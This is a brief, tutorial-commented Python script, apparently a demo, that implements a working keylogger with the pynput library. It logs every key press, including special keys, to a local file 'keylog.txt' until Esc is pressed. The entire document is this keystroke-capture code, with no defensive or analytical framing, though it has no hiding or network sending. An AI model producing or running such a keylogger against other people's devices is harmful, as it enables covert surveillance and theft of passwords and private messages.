#This library allows us to listen to and control keyboard.
from pynput import keyboard

# The file where the key logs will be stored
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    This function is called whenever a key is pressed.
    It logs the key press to the specified file.
    """
    try:
        # Try to write the character representation of the key
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # If the key is a special key (e.g., space, enter), log it differently
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    """
    This function is called whenever a key is released.
    It stops the keylogger when the 'esc' key is pressed.
    """
    # Stop the keylogger when the 'esc' key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
